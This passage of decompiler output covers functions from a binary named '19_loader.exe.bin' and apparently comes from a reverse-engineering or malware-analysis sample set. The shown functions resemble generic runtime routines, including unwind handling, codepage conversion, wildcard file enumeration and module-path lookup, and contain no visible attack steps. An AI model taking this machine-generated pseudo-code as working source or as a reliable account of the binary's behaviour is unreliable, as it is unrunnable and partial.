  if (((param_1 != (undefined **)0x0) && (param_1 != &PTR_DAT_14008c0e0)) &&
     (*(int *)((longlong)param_1 + 0x15c) == 0)) {
    FUN_140019828(param_1);
    FUN_140017fb0(param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19fe8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019fe8 rva=0x19fe8 */

undefined ** FUN_140019fe8(void)

{
  longlong lVar1;
  undefined **ppuVar2;
  
  lVar1 = FUN_140016bc0();
  if (((DAT_1400e0520 & *(uint *)(lVar1 + 0x3a8)) == 0) ||
     (ppuVar2 = *(undefined ***)(lVar1 + 0x90), ppuVar2 == (undefined **)0x0)) {
    FUN_140016ab4(4);
    ppuVar2 = FUN_14001a058((longlong *)(lVar1 + 0x90),DAT_1400e1198);
    FUN_140016ad0(4);
    if (ppuVar2 == (undefined **)0x0) {
                    /* WARNING: Subroutine does not return */
      FUN_1400160f8();
    }
  }
  return ppuVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a058 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a058 rva=0x1a058 */

undefined ** FUN_14001a058(longlong *param_1,undefined **param_2)

{
  undefined **ppuVar1;
  
  if ((param_2 == (undefined **)0x0) || (param_1 == (longlong *)0x0)) {
    param_2 = (undefined **)0x0;
  }
  else {
    ppuVar1 = (undefined **)*param_1;
    if (ppuVar1 != param_2) {
      *param_1 = (longlong)param_2;
      FUN_140019cb4((longlong)param_2);
      if (((ppuVar1 != (undefined **)0x0) &&
          (FUN_140019d40((longlong)ppuVar1), *(int *)(ppuVar1 + 2) == 0)) &&
         (ppuVar1 != &PTR_DAT_1400e0200)) {
        FUN_140019de8((longlong)ppuVar1);
      }
    }
  }
  return param_2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a0c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a0c0 rva=0x1a0c0 */

void FUN_14001a0c0(ulonglong param_1,longlong param_2,int *param_3)

{
  code *pcVar1;
  byte bVar2;
  longlong lVar3;
  byte bVar4;
  uint uVar5;
  char *pcVar6;
  byte *pbVar7;
  byte *pbVar8;
  ulonglong uVar9;
  uint uVar10;
  ulonglong uVar11;
  
  if (((longlong)*param_3 & 4U) == 0) {
    uVar9 = param_1;
  }
  else {
    uVar9 = (longlong)param_3[1] + param_1 & (longlong)-param_3[2];
  }
  pbVar7 = (byte *)(*(longlong *)(param_2 + 8) +
                   (ulonglong)*(uint *)(*(longlong *)(param_2 + 0x10) + 8));
  bVar4 = pbVar7[3];
  if ((*pbVar7 & 7) < 3) {
    if ((bVar4 & 0xf) != 0) {
LAB_14001a231:
      uVar11 = (ulonglong)bVar4 & 0xfffffffffffffff0;
      goto LAB_14001a235;
    }
  }
  else {
    uVar10 = bVar4 & 0x1f;
    if ((bVar4 & 0x1f) != 0) {
      if ((*pbVar7 & 0x40) == 0) {
        lVar3 = (ulonglong)uVar10 + 4;
      }
      else {
        lVar3 = (ulonglong)uVar10 * 2 + 5;
      }
      pbVar7 = pbVar7 + lVar3;
      uVar11 = 0;
      uVar5 = 0;
      pbVar8 = pbVar7;
      if (bVar4 >> 5 != 0) {
        do {
          pbVar7 = pbVar8 + 3;
          bVar2 = *pbVar8 >> 3;
          if (bVar2 != 0) {
            if ((*pbVar8 & 2) == 0) {
              pbVar7 = pbVar8 + (ulonglong)bVar2 + 6;
            }
            else {
              pbVar7 = pbVar7 + (ulonglong)bVar2 * 2 + 4;
            }
          }
          uVar5 = uVar5 + 1;
          pbVar8 = pbVar7;
        } while (uVar5 < bVar4 >> 5);
      }
      uVar5 = 0;
      if ((bVar4 & 0x1f) != 0) {
        do {
          bVar4 = *pbVar7;
          if (bVar4 < 4) {
LAB_14001a1df:
            if (bVar4 == 0) {
              bVar4 = pbVar7[1];
              goto LAB_14001a231;
            }
            if (0x20 < bVar4) goto switchD_14001a1ff_caseD_4;
          }
          else {
            bVar2 = bVar4 & 0xf;
            if (((byte)((bVar4 & 0xf) - 8) < 3) || (bVar2 = bVar4 & 7, (byte)((bVar4 & 7) - 4) < 4))
            {
              bVar4 = bVar2;
              goto LAB_14001a1df;
            }
            if ((bVar4 & 0x3f) != 0x20) goto switchD_14001a1ff_caseD_4;
            bVar4 = 0x20;
          }
          pcVar6 = IMAGE_DOS_HEADER_140000000.e_magic +
                   (&switchD_14001a1ff::switchdataD_14001a264)
                   [*(byte *)((longlong)&UINT_14001a278 + (ulonglong)bVar4)];
                    /* WARNING (jumptable): Sanity check requires truncation of jumptable */
                    /* WARNING: Could not find normalized switch variable to match jumptable */
          switch(*(byte *)((longlong)&UINT_14001a278 + (ulonglong)bVar4)) {
          case 0:
            lVar3 = 2;
            break;
          case 1:
            lVar3 = 5;
            break;
          case 2:
            lVar3 = 3;
            break;
          case 3:
            lVar3 = 1;
            break;
          case 4:
switchD_14001a1ff_caseD_4:
            FUN_140019970();
            pcVar1 = (code *)swi(3);
            (*pcVar1)();
            return;
          case 5:
            in((short)pbVar7);
            *(int *)pcVar6 = *(int *)pcVar6 + 1;
            *(int *)pcVar6 = *(int *)pcVar6 + 1;
            pcVar1 = (code *)swi(3);
            (*pcVar1)();
            return;
          }
          pbVar7 = pbVar7 + lVar3;
          uVar5 = uVar5 + 1;
        } while (uVar5 < uVar10);
      }
      goto LAB_14001a235;
    }
  }
  uVar11 = 0;
LAB_14001a235:
  FUN_14001a2d0(uVar11 + param_1 ^
                *(ulonglong *)(((longlong)*param_3 & 0xfffffffffffffff8U) + uVar9));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a2a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a2a0 rva=0x1a2a0 */

undefined8 FUN_14001a2a0(undefined8 param_1,ulonglong param_2,undefined8 param_3,longlong param_4)

{
  FUN_14001a0c0(param_2,param_4,*(int **)(param_4 + 0x38));
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a2d0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a2d0 rva=0x1a2d0 */

void FUN_14001a2d0(longlong param_1)

{
  if ((param_1 == DAT_1400dfc40) && ((short)((ulonglong)param_1 >> 0x30) == 0)) {
    return;
  }
  FUN_140019970();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a2f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a2f0 rva=0x1a2f0 */

ulonglong thunk_FUN_14001a2f8(undefined8 *param_1,undefined8 *param_2)

{
  uint uVar1;
  int iVar2;
  undefined8 *puVar3;
  byte *pbVar4;
  longlong *plVar5;
  LPVOID pvVar6;
  longlong lVar7;
  ulonglong uVar8;
  longlong *plVar9;
  longlong *plVar10;
  char *pcVar11;
  ulonglong uVar12;
  longlong lVar13;
  longlong lStackX_10;
  ulonglong uStackX_18;
  char *pcStackX_20;
  longlong *plStack_58;
  longlong *plStack_50;
  undefined8 uStack_48;
  
  if (param_2 == (undefined8 *)0x0) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    FUN_1400180c4();
    uVar8 = 0x16;
  }
  else {
    *param_2 = 0;
    pbVar4 = (byte *)*param_1;
    plStack_58 = (longlong *)0x0;
    plStack_50 = (longlong *)0x0;
    uStack_48 = 0;
    while (plVar9 = plStack_50, plVar10 = plStack_58, pbVar4 != (byte *)0x0) {
      lStackX_10 = CONCAT53(lStackX_10._3_5_,0x3f2a);
      pbVar4 = FUN_14001fd50(pbVar4,(byte *)&lStackX_10);
      if (pbVar4 == (byte *)0x0) {
        uVar12 = FUN_14001a880((longlong)*param_1,0,0,(longlong *)&plStack_58);
        plVar10 = plStack_58;
        uVar8 = uVar12 & 0xffffffff;
        if ((int)uVar12 != 0) {
          plVar9 = plStack_58;
          if (plStack_58 != plStack_50) {
            do {
              FUN_140017fb0((LPVOID)*plVar9);
              plVar9 = plVar9 + 1;
            } while (plVar9 != plStack_50);
          }
          goto LAB_14001a447;
        }
      }
      else {
        uVar1 = FUN_14001aa04((byte *)*param_1,pbVar4,(longlong *)&plStack_58);
        plVar10 = plStack_58;
        uVar8 = (ulonglong)uVar1;
        if (uVar1 != 0) {
          plVar9 = plStack_58;
          if (plStack_58 != plStack_50) {
            do {
              FUN_140017fb0((LPVOID)*plVar9);
              plVar9 = plVar9 + 1;
            } while (plVar9 != plStack_50);
          }
          goto LAB_14001a447;
        }
      }
      param_1 = param_1 + 1;
      pbVar4 = (byte *)*param_1;
    }
    uVar8 = 0;
    uStackX_18 = 0;
    uVar12 = ((longlong)plStack_50 - (longlong)plStack_58 >> 3) + 1;
    plVar5 = plStack_58;
    if (plStack_58 != plStack_50) {
      do {
        lVar7 = -1;
        do {
          lVar7 = lVar7 + 1;
        } while (*(char *)(*plVar5 + lVar7) != '\0');
        plVar5 = plVar5 + 1;
        uVar8 = uVar8 + 1 + lVar7;
      } while (plVar5 != plStack_50);
      uStackX_18 = uVar8;
    }
    pvVar6 = FUN_14001530c(uVar12,uStackX_18,1);
    if (pvVar6 == (LPVOID)0x0) {
      FUN_140017fb0((LPVOID)0x0);
      for (plVar5 = plVar10; plVar5 != plVar9; plVar5 = plVar5 + 1) {
        FUN_140017fb0((LPVOID)*plVar5);
      }
      uVar8 = 0xffffffff;
LAB_14001a447:
      FUN_140017fb0(plVar10);
    }
    else {
      pcVar11 = (char *)((longlong)pvVar6 + uVar12 * 8);
      pcStackX_20 = pcVar11;
      if (plVar10 != plVar9) {
        lStackX_10 = (longlong)pvVar6 - (longlong)plVar10;
        plVar5 = plVar10;
        do {
          lVar7 = -1;
          do {
            lVar13 = lVar7;
            lVar7 = lVar13 + 1;
          } while (*(char *)(*plVar5 + lVar7) != '\0');
          lVar13 = lVar13 + 2;
          iVar2 = FUN_14001fc20(pcVar11,(longlong)(pcStackX_20 + (uStackX_18 - (longlong)pcVar11)),
                                *plVar5,lVar13);
          if (iVar2 != 0) {
                    /* WARNING: Subroutine does not return */
            FUN_1400180e4();
          }
          *(char **)(lStackX_10 + (longlong)plVar5) = pcVar11;
          pcVar11 = pcVar11 + lVar13;
          plVar5 = plVar5 + 1;
        } while (plVar5 != plVar9);
      }
      *param_2 = pvVar6;
      FUN_140017fb0((LPVOID)0x0);
      for (plVar5 = plVar10; plVar5 != plVar9; plVar5 = plVar5 + 1) {
        FUN_140017fb0((LPVOID)*plVar5);
      }
      FUN_140017fb0(plVar10);
      uVar8 = 0;
    }
  }
  return uVar8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a2f8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a2f8 rva=0x1a2f8 */

ulonglong FUN_14001a2f8(undefined8 *param_1,undefined8 *param_2)

{
  uint uVar1;
  int iVar2;
  undefined8 *puVar3;
  byte *pbVar4;
  longlong *plVar5;
  LPVOID pvVar6;
  longlong lVar7;
  ulonglong uVar8;
  longlong *plVar9;
  longlong *plVar10;
  char *pcVar11;
  ulonglong uVar12;
  longlong lVar13;
  longlong local_res10;
  ulonglong local_res18;
  char *local_res20;
  longlong *local_58;
  longlong *plStack_50;
  undefined8 local_48;
  
  if (param_2 == (undefined8 *)0x0) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    FUN_1400180c4();
    uVar8 = 0x16;
  }
  else {
    *param_2 = 0;
    pbVar4 = (byte *)*param_1;
    local_58 = (longlong *)0x0;
    plStack_50 = (longlong *)0x0;
    local_48 = 0;
    while (plVar9 = plStack_50, plVar10 = local_58, pbVar4 != (byte *)0x0) {
      local_res10 = CONCAT53(local_res10._3_5_,0x3f2a);
      pbVar4 = FUN_14001fd50(pbVar4,(byte *)&local_res10);
      if (pbVar4 == (byte *)0x0) {
        uVar12 = FUN_14001a880((longlong)*param_1,0,0,(longlong *)&local_58);
        plVar10 = local_58;
        uVar8 = uVar12 & 0xffffffff;
        if ((int)uVar12 != 0) {
          plVar9 = local_58;
          if (local_58 != plStack_50) {
            do {
              FUN_140017fb0((LPVOID)*plVar9);
              plVar9 = plVar9 + 1;
            } while (plVar9 != plStack_50);
          }
          goto LAB_14001a447;
        }
      }
      else {
        uVar1 = FUN_14001aa04((byte *)*param_1,pbVar4,(longlong *)&local_58);
        plVar10 = local_58;
        uVar8 = (ulonglong)uVar1;
        if (uVar1 != 0) {
          plVar9 = local_58;
          if (local_58 != plStack_50) {
            do {
              FUN_140017fb0((LPVOID)*plVar9);
              plVar9 = plVar9 + 1;
            } while (plVar9 != plStack_50);
          }
          goto LAB_14001a447;
        }
      }
      param_1 = param_1 + 1;
      pbVar4 = (byte *)*param_1;
    }
    uVar8 = 0;
    local_res18 = 0;
    uVar12 = ((longlong)plStack_50 - (longlong)local_58 >> 3) + 1;
    plVar5 = local_58;
    if (local_58 != plStack_50) {
      do {
        lVar7 = -1;
        do {
          lVar7 = lVar7 + 1;
        } while (*(char *)(*plVar5 + lVar7) != '\0');
        plVar5 = plVar5 + 1;
        uVar8 = uVar8 + 1 + lVar7;
      } while (plVar5 != plStack_50);
      local_res18 = uVar8;
    }
    pvVar6 = FUN_14001530c(uVar12,local_res18,1);
    if (pvVar6 == (LPVOID)0x0) {
      FUN_140017fb0((LPVOID)0x0);
      for (plVar5 = plVar10; plVar5 != plVar9; plVar5 = plVar5 + 1) {
        FUN_140017fb0((LPVOID)*plVar5);
      }
      uVar8 = 0xffffffff;
LAB_14001a447:
      FUN_140017fb0(plVar10);
    }
    else {
      pcVar11 = (char *)((longlong)pvVar6 + uVar12 * 8);
      local_res20 = pcVar11;
      if (plVar10 != plVar9) {
        local_res10 = (longlong)pvVar6 - (longlong)plVar10;
        plVar5 = plVar10;
        do {
          lVar7 = -1;
          do {
            lVar13 = lVar7;
            lVar7 = lVar13 + 1;
          } while (*(char *)(*plVar5 + lVar7) != '\0');
          lVar13 = lVar13 + 2;
          iVar2 = FUN_14001fc20(pcVar11,(longlong)(local_res20 + (local_res18 - (longlong)pcVar11)),
                                *plVar5,lVar13);
          if (iVar2 != 0) {
                    /* WARNING: Subroutine does not return */
            FUN_1400180e4();
          }
          *(char **)(local_res10 + (longlong)plVar5) = pcVar11;
          pcVar11 = pcVar11 + lVar13;
          plVar5 = plVar5 + 1;
        } while (plVar5 != plVar9);
      }
      *param_2 = pvVar6;
      FUN_140017fb0((LPVOID)0x0);
      for (plVar5 = plVar10; plVar5 != plVar9; plVar5 = plVar5 + 1) {
        FUN_140017fb0((LPVOID)*plVar5);
      }
      FUN_140017fb0(plVar10);
      uVar8 = 0;
    }
  }
  return uVar8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a534 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a534 rva=0x1a534 */

uint FUN_14001a534(LPCSTR param_1,longlong param_2,undefined8 param_3,UINT param_4)

{
  int iVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  uint *puVar4;
  uint uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  bool bVar8;
  
  if (param_1 == (LPCSTR)0x0) {
    if (*(char *)(param_2 + 0x28) != '\0') {
      FUN_140017fb0(*(LPVOID *)(param_2 + 0x10));
      *(undefined1 *)(param_2 + 0x28) = 0;
    }
    *(undefined8 *)(param_2 + 0x10) = 0;
    *(undefined8 *)(param_2 + 0x18) = 0;
  }
  else {
    if (*param_1 != '\0') {
      iVar1 = FUN_140019c24(param_4,9,param_1,-1,(LPWSTR)0x0,0);
      uVar7 = (ulonglong)iVar1;
      if (iVar1 != 0) {
        uVar6 = *(ulonglong *)(param_2 + 0x18);
        if (uVar6 < uVar7) {
          if (*(char *)(param_2 + 0x28) != '\0') {
            FUN_140017fb0(*(LPVOID *)(param_2 + 0x10));
            *(undefined1 *)(param_2 + 0x28) = 0;
          }
          pvVar3 = FUN_140019a00(uVar7 * 2);
          *(LPVOID *)(param_2 + 0x10) = pvVar3;
          uVar6 = -(ulonglong)(pvVar3 != (LPVOID)0x0) & uVar7;
          uVar5 = ~-(uint)(pvVar3 != (LPVOID)0x0) & 0xc;
          if (pvVar3 != (LPVOID)0x0) {
            uVar5 = 0;
          }
          *(bool *)(param_2 + 0x28) = pvVar3 != (LPVOID)0x0;
          *(ulonglong *)(param_2 + 0x18) = uVar6;
          if (uVar5 != 0) {
            return uVar5;
          }
        }
        iVar1 = FUN_140019c24(param_4,9,param_1,-1,*(LPWSTR *)(param_2 + 0x10),(int)uVar6);
        if ((longlong)iVar1 != 0) {
          *(longlong *)(param_2 + 0x20) = (longlong)iVar1 + -1;
          return 0;
        }
      }
      DVar2 = GetLastError();
      FUN_140018e34(DVar2);
      puVar4 = (uint *)FUN_140018dec();
      return *puVar4;
    }
    if (*(longlong *)(param_2 + 0x18) == 0) {
      if (*(char *)(param_2 + 0x28) != '\0') {
        FUN_140017fb0(*(LPVOID *)(param_2 + 0x10));
        *(undefined1 *)(param_2 + 0x28) = 0;
      }
      pvVar3 = FUN_140019a00(2);
      *(LPVOID *)(param_2 + 0x10) = pvVar3;
      uVar5 = ~-(uint)(pvVar3 != (LPVOID)0x0) & 0xc;
      bVar8 = pvVar3 != (LPVOID)0x0;
      if (bVar8) {
        uVar5 = 0;
      }
      *(bool *)(param_2 + 0x28) = bVar8;
      *(ulonglong *)(param_2 + 0x18) = (ulonglong)bVar8;
      if (uVar5 != 0) {
        return uVar5;
      }
    }
    **(undefined2 **)(param_2 + 0x10) = 0;
  }
  *(undefined8 *)(param_2 + 0x20) = 0;
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a6d4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a6d4 rva=0x1a6d4 */

uint FUN_14001a6d4(short *param_1,longlong param_2,undefined8 param_3,uint param_4)

{
  int iVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  uint *puVar4;
  uint uVar5;
  ulonglong uVar6;
  bool bVar7;
  
  if (param_1 == (short *)0x0) {
    if (*(char *)(param_2 + 0x28) != '\0') {
      FUN_140017fb0(*(LPVOID *)(param_2 + 0x10));
      *(undefined1 *)(param_2 + 0x28) = 0;
    }
    *(undefined8 *)(param_2 + 0x10) = 0;
    *(undefined8 *)(param_2 + 0x18) = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_14001b0e8(param_4,0,param_1,0xffffffff);
      uVar6 = (ulonglong)iVar1;
      if (iVar1 != 0) {
        if (*(ulonglong *)(param_2 + 0x18) < uVar6) {
          if (*(char *)(param_2 + 0x28) != '\0') {
            FUN_140017fb0(*(LPVOID *)(param_2 + 0x10));
            *(undefined1 *)(param_2 + 0x28) = 0;
          }
          pvVar3 = FUN_140019a00(uVar6);
          *(LPVOID *)(param_2 + 0x10) = pvVar3;
          uVar5 = ~-(uint)(pvVar3 != (LPVOID)0x0) & 0xc;
          if (pvVar3 != (LPVOID)0x0) {
            uVar5 = 0;
          }
          *(bool *)(param_2 + 0x28) = pvVar3 != (LPVOID)0x0;
          *(ulonglong *)(param_2 + 0x18) = -(ulonglong)(pvVar3 != (LPVOID)0x0) & uVar6;
          if (uVar5 != 0) {
            return uVar5;
          }
        }
        iVar1 = FUN_14001b0e8(param_4,0,param_1,0xffffffff);
        if ((longlong)iVar1 != 0) {
          *(longlong *)(param_2 + 0x20) = (longlong)iVar1 + -1;
          return 0;
        }
      }
      DVar2 = GetLastError();
      FUN_140018e34(DVar2);
      puVar4 = (uint *)FUN_140018dec();
      return *puVar4;
    }
    if (*(longlong *)(param_2 + 0x18) == 0) {
      if (*(char *)(param_2 + 0x28) != '\0') {
        FUN_140017fb0(*(LPVOID *)(param_2 + 0x10));
        *(undefined1 *)(param_2 + 0x28) = 0;
      }
      pvVar3 = FUN_140019a00(1);
      *(LPVOID *)(param_2 + 0x10) = pvVar3;
      uVar5 = ~-(uint)(pvVar3 != (LPVOID)0x0) & 0xc;
      bVar7 = pvVar3 != (LPVOID)0x0;
      if (bVar7) {
        uVar5 = 0;
      }
      *(bool *)(param_2 + 0x28) = bVar7;
      *(ulonglong *)(param_2 + 0x18) = (ulonglong)bVar7;
      if (uVar5 != 0) {
        return uVar5;
      }
    }
    **(undefined1 **)(param_2 + 0x10) = 0;
  }
  *(undefined8 *)(param_2 + 0x20) = 0;
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1a880 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001a880 rva=0x1a880 */

undefined8 FUN_14001a880(longlong param_1,longlong param_2,ulonglong param_3,longlong *param_4)

{
  int iVar1;
  char *pcVar2;
  LPVOID pvVar3;
  longlong lVar5;
  longlong lVar4;
  ulonglong uVar6;
  undefined8 uVar7;
  ulonglong uVar8;
  
  uVar7 = 0;
  lVar4 = -1;
  do {
    lVar5 = lVar4;
    lVar4 = lVar5 + 1;
  } while (*(char *)(param_1 + lVar4) != '\0');
  uVar6 = lVar5 + 2;
  if (~param_3 < uVar6) {
    return 0xc;
  }
  uVar8 = param_3 + 1 + uVar6;
  pcVar2 = FUN_140019980(uVar8,1);
  if (((param_3 != 0) && (iVar1 = FUN_14001fc20(pcVar2,uVar8,param_2,param_3), iVar1 != 0)) ||
     (iVar1 = FUN_14001fc20(pcVar2 + param_3,uVar8 - param_3,param_1,uVar6), iVar1 != 0)) {
                    /* WARNING: Subroutine does not return */
    FUN_1400180e4();
  }
  if (param_4[1] == param_4[2]) {
    if (*param_4 == 0) {
      pvVar3 = FUN_140019980(4,8);
      *param_4 = (longlong)pvVar3;
      FUN_140017fb0((LPVOID)0x0);
      lVar4 = *param_4;
      if (lVar4 != 0) {
        param_4[1] = lVar4;
        param_4[2] = lVar4 + 0x20;
        goto LAB_14001a9d6;
      }
    }
    else {
      uVar6 = param_4[2] - *param_4 >> 3;
      if (uVar6 < 0x8000000000000000) {
        pvVar3 = FUN_14001b040((LPVOID)*param_4,uVar6 * 2,8);
        if (pvVar3 != (LPVOID)0x0) {
          *param_4 = (longlong)pvVar3;
          param_4[1] = (longlong)((longlong)pvVar3 + uVar6 * 8);
          param_4[2] = (longlong)((longlong)pvVar3 + uVar6 * 0x10);
          FUN_140017fb0((LPVOID)0x0);
          goto LAB_14001a9d6;
        }
        FUN_140017fb0((LPVOID)0x0);
      }
    }
    uVar7 = 0xc;
    FUN_140017fb0(pcVar2);
  }
  else {
LAB_14001a9d6:
    *(char **)param_4[1] = pcVar2;
    param_4[1] = param_4[1] + 8;
  }
  FUN_140017fb0((LPVOID)0x0);
  return uVar7;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1aa04 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001aa04 rva=0x1aa04 */

void FUN_14001aa04(byte *param_1,byte *param_2,longlong *param_3)

{
  byte bVar1;
  char *pcVar2;
  uint uVar3;
  BOOL BVar4;
  HANDLE hFindFile;
  INT_PTR IVar5;
  undefined8 uVar6;
  LPCWSTR lpFileName;
  char *pcVar7;
  longlong lVar8;
  longlong lVar9;
  byte bVar10;
  UINT UVar11;
  ulonglong uVar12;
  undefined1 auStackY_378 [32];
  undefined1 local_348 [8];
  ulonglong local_340;
  undefined8 local_338;
  undefined8 local_330;
  LPCWSTR local_328;
  undefined8 local_320;
  undefined8 local_318;
  char local_310;
  longlong local_308;
  longlong local_300;
  char local_2f0;
  longlong local_2e8;
  longlong local_2e0;
  char local_2d0;
  undefined8 local_2c8;
  undefined8 local_2c0;
  char *local_2b8;
  undefined8 local_2b0;
  undefined8 local_2a8;
  char local_2a0;
  _WIN32_FIND_DATAW local_298;
  ulonglong local_48;
  
  local_48 = DAT_1400dfc40 ^ (ulonglong)auStackY_378;
  while ((param_2 != param_1 &&
         ((0x2d < (byte)(*param_2 - 0x2f) ||
          ((0x200000000801U >> ((longlong)(char)(*param_2 - 0x2f) & 0x3fU) & 1) == 0))))) {
    param_2 = (byte *)FUN_1400201ac(param_1,param_2);
  }
  if ((*param_2 == 0x3a) && (param_2 != param_1 + 1)) {
    FUN_14001a880((longlong)param_1,0,0,param_3);
  }
  else {
    bVar10 = *param_2 - 0x2f;
    if ((0x2d < bVar10) ||
       (bVar1 = 1, (0x200000000801U >> ((longlong)(char)bVar10 & 0x3fU) & 1) == 0)) {
      bVar1 = 0;
    }
    uVar12 = -(ulonglong)bVar1 & (ulonglong)(param_2 + (1 - (longlong)param_1));
    local_340 = uVar12;
    FUN_1400225e0((undefined1 (*) [32])&local_298,0,0x250);
    local_338 = 0;
    local_330 = 0;
    local_328 = (LPCWSTR)0x0;
    local_320 = 0;
    local_318 = 0;
    local_310 = '\0';
    FUN_14001743c(&local_308,(undefined4 *)0x0);
    if (*(int *)(local_300 + 0xc) == 0xfde9) {
      if (local_2f0 != '\0') {
        *(uint *)(local_308 + 0x3a8) = *(uint *)(local_308 + 0x3a8) & 0xfffffffd;
      }
      UVar11 = 0xfde9;
    }
    else {
      IVar5 = FUN_14001650c();
      if ((int)IVar5 == 0) {
        if (local_2f0 != '\0') {
          *(uint *)(local_308 + 0x3a8) = *(uint *)(local_308 + 0x3a8) & 0xfffffffd;
        }
        UVar11 = 1;
      }
      else {
        if (local_2f0 != '\0') {
          *(uint *)(local_308 + 0x3a8) = *(uint *)(local_308 + 0x3a8) & 0xfffffffd;
        }
        UVar11 = 0;
      }
    }
    uVar3 = FUN_14001a534((LPCSTR)param_1,(longlong)&local_338,local_348,UVar11);
    lpFileName = local_328;
    if (uVar3 != 0) {
      lpFileName = (LPCWSTR)0x0;
    }
    hFindFile = FindFirstFileExW(lpFileName,FindExInfoStandard,&local_298,FindExSearchNameMatch,
                                 (LPVOID)0x0,0);
    if (hFindFile == (HANDLE)0xffffffffffffffff) {
      FUN_14001a880((longlong)param_1,0,0,param_3);
      if (local_310 != '\0') {
        FUN_140017fb0(local_328);
      }
    }
    else {
      lVar9 = param_3[1] - *param_3 >> 3;
      do {
        uVar3 = 0;
        local_2c8 = 0;
        local_2c0 = 0;
        local_2b8 = (char *)0x0;
        local_2b0 = 0;
        local_2a8 = 0;
        local_2a0 = '\0';
        FUN_14001743c(&local_2e8,(undefined4 *)0x0);
        if (*(int *)(local_2e0 + 0xc) == 0xfde9) {
          if (local_2d0 != '\0') {
            *(uint *)(local_2e8 + 0x3a8) = *(uint *)(local_2e8 + 0x3a8) & 0xfffffffd;
          }
          uVar3 = 0xfde9;
        }
        else {
          IVar5 = FUN_14001650c();
          if ((int)IVar5 == 0) {
            if (local_2d0 != '\0') {
              *(uint *)(local_2e8 + 0x3a8) = *(uint *)(local_2e8 + 0x3a8) & 0xfffffffd;
            }
            uVar3 = 1;
          }
          else if (local_2d0 != '\0') {
            *(uint *)(local_2e8 + 0x3a8) = *(uint *)(local_2e8 + 0x3a8) & 0xfffffffd;
          }
        }
        uVar3 = FUN_14001a6d4(local_298.cFileName,(longlong)&local_2c8,local_348,uVar3);
        pcVar2 = local_2b8;
        pcVar7 = local_2b8;
        if (uVar3 != 0) {
          pcVar7 = (char *)0x0;
        }
        if ((*pcVar7 == '.') && ((pcVar7[1] == '\0' || ((pcVar7[1] == '.' && (pcVar7[2] == '\0')))))
           ) {
          if (local_2a0 != '\0') {
            FUN_140017fb0(local_2b8);
          }
        }
        else {
          uVar6 = FUN_14001a880((longlong)pcVar7,(longlong)param_1,uVar12,param_3);
          if ((int)uVar6 != 0) {
            if (local_2a0 != '\0') {
              FUN_140017fb0(pcVar2);
            }
            FindClose(hFindFile);
            if (local_310 != '\0') {
              FUN_140017fb0(local_328);
            }
            goto LAB_14001ad41;
          }
          if (local_2a0 != (char)uVar6) {
            FUN_140017fb0(pcVar2);
          }
          uVar12 = local_340;
        }
        BVar4 = FindNextFileW(hFindFile,&local_298);
      } while (BVar4 != 0);
      lVar8 = param_3[1] - *param_3 >> 3;
      if (lVar9 != lVar8) {
        FUN_14001f880((undefined1 *)(*param_3 + lVar9 * 8),lVar8 - lVar9,8,&LAB_14001ad64);
      }
      FindClose(hFindFile);
      if (local_310 != '\0') {
        FUN_140017fb0(local_328);
      }
    }
  }
LAB_14001ad41:
  FUN_14001a2d0(local_48 ^ (ulonglong)auStackY_378);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ad78 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ad78 rva=0x1ad78 */

void FUN_14001ad78(HMODULE param_1,undefined8 param_2,ulonglong param_3)

{
  DWORD DVar1;
  INT_PTR IVar2;
  uint uVar3;
  undefined1 auStack_2a8 [32];
  undefined1 local_288 [8];
  longlong local_280;
  longlong local_278;
  char local_268;
  undefined8 local_260;
  ulonglong local_258;
  undefined8 local_250;
  ulonglong local_248;
  undefined8 local_240;
  undefined1 local_238;
  WCHAR local_228 [264];
  ulonglong local_18;
  
  local_18 = DAT_1400dfc40 ^ (ulonglong)auStack_2a8;
  DVar1 = GetModuleFileNameW(param_1,local_228,0x105);
  if (DVar1 == 0) {
    DVar1 = GetLastError();
    FUN_140018e34(DVar1);
  }
  else {
    local_240 = 0;
    local_238 = 0;
    local_260 = param_2;
    local_258 = param_3 & 0xffffffff;
    local_250 = param_2;
    local_248 = param_3 & 0xffffffff;
    FUN_14001743c(&local_280,(undefined4 *)0x0);
    uVar3 = 0xfde9;
    if (*(int *)(local_278 + 0xc) == 0xfde9) {
      if (local_268 != '\0') {
        *(uint *)(local_280 + 0x3a8) = *(uint *)(local_280 + 0x3a8) & 0xfffffffd;
      }
    }
    else {
      IVar2 = FUN_14001650c();
      if ((int)IVar2 == 0) {
        if (local_268 != (char)IVar2) {
          *(uint *)(local_280 + 0x3a8) = *(uint *)(local_280 + 0x3a8) & 0xfffffffd;
        }
        uVar3 = 1;
      }
      else {
        if (local_268 != '\0') {
          *(uint *)(local_280 + 0x3a8) = *(uint *)(local_280 + 0x3a8) & 0xfffffffd;
        }
        uVar3 = 0;
      }
    }
